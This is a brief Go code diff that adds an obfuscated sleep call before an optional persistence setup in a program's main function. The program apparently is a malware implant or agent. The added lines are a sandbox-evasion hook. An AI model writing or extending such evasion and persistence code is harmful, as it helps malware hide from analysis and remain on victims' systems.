@@ -12,6 +12,10 @@ import (
 func main() {
 	cfg := config.Load()
 
+	if cfg.SleepSeconds > 0 {
+		sleepObfuscated(cfg.SleepSeconds)
+	}
+
 	if cfg.EnablePersistence {
 		if err := persistence.Setup(); err != nil {
 			log.Printf("Warning: Failed to setup persistence: %v", err)
